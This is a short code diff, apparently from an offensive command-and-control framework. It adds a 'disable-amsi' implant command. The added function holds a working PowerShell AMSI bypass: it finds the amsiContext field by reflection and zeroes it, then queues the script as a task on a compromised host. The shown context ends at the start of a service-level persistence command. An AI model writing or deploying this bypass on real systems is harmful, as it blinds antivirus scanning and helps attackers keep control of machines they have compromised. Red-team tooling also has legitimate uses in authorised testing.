@@ -107,6 +107,38 @@ def get_commands():
 
 
 @command(commands, commands_help, examples, block_help)
+def do_disable_amsi(user, command, implant_id):
+    """
+    Disables / wipes the amsiContext
+
+    ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass
+
+    Examples:
+        disable-amsi
+    """
+
+    command = """
+$a = [Ref].Assembly.GetTypes()
+ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}}
+$d = $c.GetFields('NonPublic,Static')
+ForEach($e in $d) {if ($e.Name -like "*Context") {$f = $e}}
+$g = $f.GetValue($null)
+[IntPtr]$ptr = $g
+[Int32[]]$buf = @(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+"""
+
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+
+
+@command(commands, commands_help, examples, block_help)
 def do_install_servicelevel_persistence(user, command, implant_id):
     """
     [Requires Elevation]
